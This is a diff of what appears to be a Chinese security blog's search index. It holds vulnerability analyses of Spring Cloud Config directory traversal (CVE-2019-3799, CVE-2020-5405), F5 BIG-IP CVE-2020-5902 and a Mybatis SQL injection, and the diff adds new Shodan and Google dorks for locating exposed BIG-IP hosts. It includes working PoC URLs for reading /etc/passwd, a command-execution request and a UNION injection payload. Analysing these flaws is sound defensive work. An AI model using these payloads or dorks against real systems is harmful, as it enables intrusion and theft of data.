@@ -1,66 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CVE-2019-3799 Spring Cloud Config目录遍历漏洞</title>
-    <url>/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/</url>
-    <content><![CDATA[<p>官方描述：<a href="https://spring.io/blog/2019/04/17/cve-2019-3799-spring-cloud-config-2-1-2-2-0-4-1-4-6-released" target="_blank" rel="noopener">https://spring.io/blog/2019/04/17/cve-2019-3799-spring-cloud-config-2-1-2-2-0-4-1-4-6-released</a></p>
-<blockquote>
-<p>We have released Spring Cloud Config 2.1.2, 2.0.4, and 1.4.6 to address <a href="https://pivotal.io/security/cve-2019-3799" target="_blank" rel="noopener">CVE-2019-3799: Directory Traversal with spring-cloud-config-server</a>. Please review the information in the CVE report and upgrade immediately.</p>
-</blockquote>
-<p>在<a href="https://github.com/spring-cloud/spring-cloud-config/releases" target="_blank" rel="noopener">release</a>中找到修复前的版本2.1.1代码 <a href="https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE</a> 用于复现</p>
-<a id="more"></a>
-
-<p>本次更新的代码路径为<code>spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/resource/GenericResourceRepository.java</code>，commit地址为 <a href="https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2</a></p>
-<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p>补丁主要是在findOne()方法中增加了传入参数path的判断</p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/diff-2.1.1-findOne.png" alt="diff-2.1.1-findOne.png"></p>
-<p><code>isInvalidPath</code>方法用于判断路径中是否存在<code>WEB-INF</code>、<code>META-INF</code>、<code>:/</code>、<code>../</code>，如果存在则返回true，导致<code>if (!isInvalidPath(local))</code>为假。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isInvalidPath</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">"WEB-INF"</span>) || path.contains(<span class="string">"META-INF"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Path with \"WEB-INF\" or \"META-INF\": ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">":/"</span>)) &#123;</span><br><span class="line">        String relativePath = (path.charAt(<span class="number">0</span>) == <span class="string">'/'</span> ? path.substring(<span class="number">1</span>) : path);</span><br><span class="line">        <span class="keyword">if</span> (ResourceUtils.isUrl(relativePath) || relativePath.startsWith(<span class="string">"url:"</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">                logger.warn(<span class="string">"Path represents URL or has \"url:\" prefix: ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">".."</span>) &amp;&amp; StringUtils.cleanPath(path).contains(<span class="string">"../"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Path contains \"../\" after call to StringUtils#cleanPath: ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>isInvalidEncodedPath</code>方法用于判断路径中是否存在<code>%</code>，若存在则再进行一次URL解码再调用<code>isInvalidPath</code>方法。</p>
-<p>第二个和第三个if中的<code>processPath</code>方法是将<code>\</code>替换成<code>/</code>，再清除连续重复的<code>/</code>。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isInvalidEncodedPath</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">"%"</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Use URLDecoder (vs UriUtils) to preserve potentially decoded UTF-8 chars</span></span><br><span class="line">            String decodedPath = URLDecoder.decode(path, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">if</span> (isInvalidPath(decodedPath)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            decodedPath = processPath(decodedPath);</span><br><span class="line">            <span class="keyword">if</span> (isInvalidPath(decodedPath)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalArgumentException | UnsupportedEncodingException ex) &#123;</span><br><span class="line">            <span class="comment">// Should never happen...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><blockquote>
-<p>调试所使用版本为<code>spring-cloud-config-2.1.1.RELEASE</code></p>
-</blockquote>
-<p>既然是findOne()方法中增加了路径分析，表明之前未做路径防护可能导致任意文件读取漏洞产生。回溯findOne()方法就能找到漏洞的利用点。查看findOne()方法的调用信息（在方法处右键点击Find Usages），可以看到有12处相关引用，由于限制在path参数，于是主要寻找path参数可控的点。</p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/find-findOne-usages.png" alt="find-findOne-usages.png"></p>
-<p>找到<code>src/main/java/org/springframework/cloud/config/server/resource/ResourceController.java</code>中调用了<code>findOne()</code>方法，且path可控。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/&#123;name&#125;/&#123;profile&#125;/&#123;label&#125;/**"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">retrieve</span><span class="params">(@PathVariable String name, @PathVariable String profile,</span></span></span><br><span class="line"><span class="function"><span class="params">        @PathVariable String label, ServletWebRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">        @RequestParam(defaultValue = <span class="string">"true"</span>)</span> <span class="keyword">boolean</span> resolvePlaceholders)</span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String path = getFilePath(request, name, profile, label);</span><br><span class="line">    <span class="keyword">return</span> retrieve(request, name, profile, label, path, resolvePlaceholders);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> String <span class="title">retrieve</span><span class="params">(ServletWebRequest request, String name, String profile,</span></span></span><br><span class="line"><span class="function"><span class="params">        String label, String path, <span class="keyword">boolean</span> resolvePlaceholders)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    name = resolveName(name);</span><br><span class="line">    label = resolveLabel(label);</span><br><span class="line">    Resource resource = <span class="keyword">this</span>.resourceRepository.findOne(name, profile, label, path);</span><br><span class="line">    <span class="keyword">if</span> (checkNotModified(request, resource)) &#123;</span><br><span class="line">        <span class="comment">// Content was not modified. Just return.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ensure InputStream will be closed to prevent file locks on Windows</span></span><br><span class="line">    <span class="keyword">try</span> (InputStream is = resource.getInputStream()) &#123;</span><br><span class="line">        String text = StreamUtils.copyToString(is, Charset.forName(<span class="string">"UTF-8"</span>));</span><br><span class="line">        <span class="keyword">if</span> (resolvePlaceholders) &#123;</span><br><span class="line">            Environment environment = <span class="keyword">this</span>.environmentRepository.findOne(name,</span><br><span class="line">                    profile, label);</span><br><span class="line">            text = resolvePlaceholders(prepareEnvironment(environment), text);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>path参数为<code>@RequestMapping(&quot;/{name}/{profile}/{label}/**&quot;)</code>中<code>**</code>的部分，也就是uri第三个标签后的全部内容。注意此处传入的label必须为master，具体原因在CVE-2020-5405中会讲到。</p>
-<p>传入<code>GET /name/profile/master/..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt</code>时，path参数为<code>..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt</code></p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-retrieve.png" alt="debug-retrieve"></p>
-<p><code>FileUrlResource</code>对象中的<code>relativePath</code>为<code>..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Ftest.txt</code></p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-FileUrlResource.png" alt="debug-FileUrlResource"></p>
-<p>path解码后的路径，路径回溯正好变成<code>/tmp/test.txt</code></p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-file.png" alt="debug-file"></p>
-<p>findOne()方法执行完成之后，返回Resource对象。Resource是Spring框架中用于访问低级资源的一个抽象接口，常用来读取配置文件。</p>
-<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-return-file.png" alt="debug-return-file" style="zoom:43%;">
-
-<p>根据findOne()返回的Resource对象，读取到的文件内容。</p>
-<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-get-text.png" alt="debug-get-text" style="zoom:40%;">
-
-
-
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>IDEA导入程序后，先等待maven自动安装依赖。依赖安装完成后，找到spring-cloud-config-server中<code>src/main/java/org/springframework/cloud/config/server/ConfigServerApplication.java</code>，点击<code>ConfigServerApplication</code>类右边的运行，启动程序即可，端口默认为8888，想要修改端口的话可在<code>src/main/resources/configserver.yml</code>中修改。</p>
-<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/run-application.png" alt="run-application.png" style="zoom:40%;">
-
-
-
-<p>程序运行起来之后访问<code>http(s)://ip:port/foo/label/master/..%252f..%252f..%252f..%252fetc%252fpasswd</code>得到以下结果</p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/poc-request.png" alt="poc-request"></p>
-<p>不二次编码的效果如下，因为不二次编码传到代码前会自动URL解码一次，变成<code>/foo/label/master/../../../../etc/passwd</code>，等效于直接访问<code>/../etc/passwd</code>，tomcat会把它识别成一个错误的URI，请求不会传到ResourceController中，也就不会进行后续<code>findOne()</code>方法的调用。</p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/not-double-encode.png" alt="not-double-encode"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>CVE-2020-5405 Spring Cloud Config目录遍历漏洞绕过</title>
     <url>/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/</url>
     <content><![CDATA[<p>该漏洞是CVE-2019-3799的绕过。</p>
@@ -140,6 +80,66 @@
 
 <h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>通用的PoC，绝对路径和相对路径都能使用：<a href="http://127.0.0.1:8889/test/test/%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%252ftmp/test.txt" target="_blank" rel="noopener">http://127.0.0.1:8889/test/test/%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%252ftmp/test.txt</a></p>
 <p><img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/poc-request.png" alt="poc-request"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>CVE-2019-3799 Spring Cloud Config目录遍历漏洞</title>
+    <url>/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/</url>
+    <content><![CDATA[<p>官方描述：<a href="https://spring.io/blog/2019/04/17/cve-2019-3799-spring-cloud-config-2-1-2-2-0-4-1-4-6-released" target="_blank" rel="noopener">https://spring.io/blog/2019/04/17/cve-2019-3799-spring-cloud-config-2-1-2-2-0-4-1-4-6-released</a></p>
+<blockquote>
+<p>We have released Spring Cloud Config 2.1.2, 2.0.4, and 1.4.6 to address <a href="https://pivotal.io/security/cve-2019-3799" target="_blank" rel="noopener">CVE-2019-3799: Directory Traversal with spring-cloud-config-server</a>. Please review the information in the CVE report and upgrade immediately.</p>
+</blockquote>
+<p>在<a href="https://github.com/spring-cloud/spring-cloud-config/releases" target="_blank" rel="noopener">release</a>中找到修复前的版本2.1.1代码 <a href="https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE</a> 用于复现</p>
+<a id="more"></a>
+
+<p>本次更新的代码路径为<code>spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/resource/GenericResourceRepository.java</code>，commit地址为 <a href="https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2</a></p>
+<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p>补丁主要是在findOne()方法中增加了传入参数path的判断</p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/diff-2.1.1-findOne.png" alt="diff-2.1.1-findOne.png"></p>
+<p><code>isInvalidPath</code>方法用于判断路径中是否存在<code>WEB-INF</code>、<code>META-INF</code>、<code>:/</code>、<code>../</code>，如果存在则返回true，导致<code>if (!isInvalidPath(local))</code>为假。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isInvalidPath</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">"WEB-INF"</span>) || path.contains(<span class="string">"META-INF"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Path with \"WEB-INF\" or \"META-INF\": ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">":/"</span>)) &#123;</span><br><span class="line">        String relativePath = (path.charAt(<span class="number">0</span>) == <span class="string">'/'</span> ? path.substring(<span class="number">1</span>) : path);</span><br><span class="line">        <span class="keyword">if</span> (ResourceUtils.isUrl(relativePath) || relativePath.startsWith(<span class="string">"url:"</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">                logger.warn(<span class="string">"Path represents URL or has \"url:\" prefix: ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">".."</span>) &amp;&amp; StringUtils.cleanPath(path).contains(<span class="string">"../"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Path contains \"../\" after call to StringUtils#cleanPath: ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>isInvalidEncodedPath</code>方法用于判断路径中是否存在<code>%</code>，若存在则再进行一次URL解码再调用<code>isInvalidPath</code>方法。</p>
+<p>第二个和第三个if中的<code>processPath</code>方法是将<code>\</code>替换成<code>/</code>，再清除连续重复的<code>/</code>。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isInvalidEncodedPath</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">"%"</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Use URLDecoder (vs UriUtils) to preserve potentially decoded UTF-8 chars</span></span><br><span class="line">            String decodedPath = URLDecoder.decode(path, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">if</span> (isInvalidPath(decodedPath)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            decodedPath = processPath(decodedPath);</span><br><span class="line">            <span class="keyword">if</span> (isInvalidPath(decodedPath)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalArgumentException | UnsupportedEncodingException ex) &#123;</span><br><span class="line">            <span class="comment">// Should never happen...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><blockquote>
+<p>调试所使用版本为<code>spring-cloud-config-2.1.1.RELEASE</code></p>
+</blockquote>
+<p>既然是findOne()方法中增加了路径分析，表明之前未做路径防护可能导致任意文件读取漏洞产生。回溯findOne()方法就能找到漏洞的利用点。查看findOne()方法的调用信息（在方法处右键点击Find Usages），可以看到有12处相关引用，由于限制在path参数，于是主要寻找path参数可控的点。</p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/find-findOne-usages.png" alt="find-findOne-usages.png"></p>
+<p>找到<code>src/main/java/org/springframework/cloud/config/server/resource/ResourceController.java</code>中调用了<code>findOne()</code>方法，且path可控。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/&#123;name&#125;/&#123;profile&#125;/&#123;label&#125;/**"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">retrieve</span><span class="params">(@PathVariable String name, @PathVariable String profile,</span></span></span><br><span class="line"><span class="function"><span class="params">        @PathVariable String label, ServletWebRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">        @RequestParam(defaultValue = <span class="string">"true"</span>)</span> <span class="keyword">boolean</span> resolvePlaceholders)</span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String path = getFilePath(request, name, profile, label);</span><br><span class="line">    <span class="keyword">return</span> retrieve(request, name, profile, label, path, resolvePlaceholders);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> String <span class="title">retrieve</span><span class="params">(ServletWebRequest request, String name, String profile,</span></span></span><br><span class="line"><span class="function"><span class="params">        String label, String path, <span class="keyword">boolean</span> resolvePlaceholders)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    name = resolveName(name);</span><br><span class="line">    label = resolveLabel(label);</span><br><span class="line">    Resource resource = <span class="keyword">this</span>.resourceRepository.findOne(name, profile, label, path);</span><br><span class="line">    <span class="keyword">if</span> (checkNotModified(request, resource)) &#123;</span><br><span class="line">        <span class="comment">// Content was not modified. Just return.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ensure InputStream will be closed to prevent file locks on Windows</span></span><br><span class="line">    <span class="keyword">try</span> (InputStream is = resource.getInputStream()) &#123;</span><br><span class="line">        String text = StreamUtils.copyToString(is, Charset.forName(<span class="string">"UTF-8"</span>));</span><br><span class="line">        <span class="keyword">if</span> (resolvePlaceholders) &#123;</span><br><span class="line">            Environment environment = <span class="keyword">this</span>.environmentRepository.findOne(name,</span><br><span class="line">                    profile, label);</span><br><span class="line">            text = resolvePlaceholders(prepareEnvironment(environment), text);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>path参数为<code>@RequestMapping(&quot;/{name}/{profile}/{label}/**&quot;)</code>中<code>**</code>的部分，也就是uri第三个标签后的全部内容。注意此处传入的label必须为master，具体原因在CVE-2020-5405中会讲到。</p>
+<p>传入<code>GET /name/profile/master/..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt</code>时，path参数为<code>..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt</code></p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-retrieve.png" alt="debug-retrieve"></p>
+<p><code>FileUrlResource</code>对象中的<code>relativePath</code>为<code>..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Ftest.txt</code></p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-FileUrlResource.png" alt="debug-FileUrlResource"></p>
+<p>path解码后的路径，路径回溯正好变成<code>/tmp/test.txt</code></p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-file.png" alt="debug-file"></p>
+<p>findOne()方法执行完成之后，返回Resource对象。Resource是Spring框架中用于访问低级资源的一个抽象接口，常用来读取配置文件。</p>
+<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-return-file.png" alt="debug-return-file" style="zoom:43%;">
+
+<p>根据findOne()返回的Resource对象，读取到的文件内容。</p>
+<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-get-text.png" alt="debug-get-text" style="zoom:40%;">
+
+
+
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>IDEA导入程序后，先等待maven自动安装依赖。依赖安装完成后，找到spring-cloud-config-server中<code>src/main/java/org/springframework/cloud/config/server/ConfigServerApplication.java</code>，点击<code>ConfigServerApplication</code>类右边的运行，启动程序即可，端口默认为8888，想要修改端口的话可在<code>src/main/resources/configserver.yml</code>中修改。</p>
+<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/run-application.png" alt="run-application.png" style="zoom:40%;">
+
+
+
+<p>程序运行起来之后访问<code>http(s)://ip:port/foo/label/master/..%252f..%252f..%252f..%252fetc%252fpasswd</code>得到以下结果</p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/poc-request.png" alt="poc-request"></p>
+<p>不二次编码的效果如下，因为不二次编码传到代码前会自动URL解码一次，变成<code>/foo/label/master/../../../../etc/passwd</code>，等效于直接访问<code>/../etc/passwd</code>，tomcat会把它识别成一个错误的URI，请求不会传到ResourceController中，也就不会进行后续<code>findOne()</code>方法的调用。</p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/not-double-encode.png" alt="not-double-encode"></p>
 ]]></content>
   </entry>
   <entry>
@@ -226,9 +226,26 @@
 <p>BIG-IP  15.1.0, 15.0.0, 14.1.0-14.1.2, 13.1.0-13.1.3, 12.1.0-12.1.5, 11.6.1-11.6.5</p>
 <a id="more"></a>
 
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="资产发现"><a href="#资产发现" class="headerlink" title="资产发现"></a>资产发现</h2><p>shodan搜索语法</p>
-<p><code>http.favicon.hash:-335242539</code></p>
-<p><code>http.title:&quot;BIG-IP&amp;reg;- Redirect&quot;</code></p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="资产发现"><a href="#资产发现" class="headerlink" title="资产发现"></a>资产发现</h2><p>Google dork</p>
+<ul>
+<li><code>inurl: &quot;tmui/login.jsp&quot;</code></li>
+<li><code>intitle:&quot;BIG-IP&quot; inurl:&quot;tmui&quot;</code></li>
+</ul>
+<p>shodan搜索语法</p>
+<ul>
+<li><p><code>F5-Login-Page</code></p>
+</li>
+<li><p><code>WWW-Authenticate: Basic realm=BIG-IP</code></p>
+</li>
+<li><p><code>BigIP</code></p>
+</li>
+<li><p><code>BIG-IP</code></p>
+</li>
+<li><p><code>http.favicon.hash:-335242539</code></p>
+</li>
+<li><p><code>http.title:&quot;BIG-IP&amp;reg;- Redirect&quot;</code></p>
+</li>
+</ul>
 <p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/shodan-f5.png" alt="shodan-f5"></p>
 <h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>文件读取：<code>https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code></p>
 <p>命令执行：<code>https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</code></p>
@@ -390,6 +407,136 @@
 <p><a href="https://paper.seebug.org/1192/" target="_blank" rel="noopener">https://paper.seebug.org/1192/</a></p>
 <p><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p>
 <p><a href="http://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java SpringBoot框架代码审计三 - SQL注入</title>
+    <url>/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/</url>
+    <content><![CDATA[<h1 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h1><p>SQL注入是代审中最容易找的漏洞之一，一般都在固定的模块存放SQL语句，只需在这些SQL语句中搜寻是否拼接参数即可。</p>
+<p><a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">案例项目</a>使用Mybatis作为数据持久层框架，进行数据库的各种操作。MyBatis的主要思想是将程序中的大量SQL语句剥离出来，配置在配置文件当中，实现SQL的灵活配置。配置文件常存放在<code>src/main/resources/mapper</code>中，配置文件命名为<code>ExampleMapper.xml</code></p>
+<a id="more"></a>
+
+<p>在<a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">项目</a>的第一个issue中看到已经有人提出<a href="https://github.com/newbee-ltd/newbee-mall/issues/1" target="_blank" rel="noopener">SQL注入漏洞</a>，并给出poc： <code>http://127.0.0.1:28089/search?goodsCategoryId=&amp;keyword=\%&#39;)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176627871,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x7162786b71),NULL,NULL#&amp;orderBy=default</code>   </p>
+<img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/SQLi-issue.png" alt="SQLi-issue" style="zoom:50%;">
+
+<p>随后作者对该SQL注入点进行修复，<a href="https://github.com/newbee-ltd/newbee-mall/commit/dac570107a67044ac754c9a20cd6ef305ed56b0e#comments" target="_blank" rel="noopener">commit</a>中将<code>like</code>模糊查询处的<code>${keyword}</code>改为<code>#{keyword}</code>。</p>
+<img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/fix-sqli-ommit.png" alt="fix-sqli-ommit" style="zoom:40%;">
+
+
+
